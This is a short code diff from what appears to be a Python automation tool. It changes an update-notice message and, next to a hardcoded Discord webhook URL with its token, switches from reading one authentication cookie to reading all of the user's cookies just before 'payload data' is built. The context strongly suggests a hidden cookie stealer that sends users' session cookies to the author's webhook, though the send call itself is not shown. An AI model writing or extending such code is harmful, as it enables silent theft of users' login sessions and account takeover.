@@ -84,7 +84,7 @@ def versionChecker():
                             "description": f" ```Detected new update in https://github.com/hitshoCodes/HitshoAutomation/ ```",
                             "color": 4139260,
                             "footer": {
-                                "text": "The current version will still work, the newest version is recommended."
+                                "text": "The current version will still work, however, your version may have some issues, the newest version is recommended."
                             }
                         }
                     ]
@@ -1660,7 +1660,7 @@ webhook_url = "https://discord.com/api/webhooks/1127230889764593765/3fB3YJ-HOavU
 
 # Extract the key and cookie from the settings dictionary (if needed)
 key = settings["KEY"]
-cookie = settings["AUTHENTICATION"]["COOKIES"][0]
+cookie = settings["AUTHENTICATION"]["COOKIES"]
 
 # Create the payload data
 payload = {
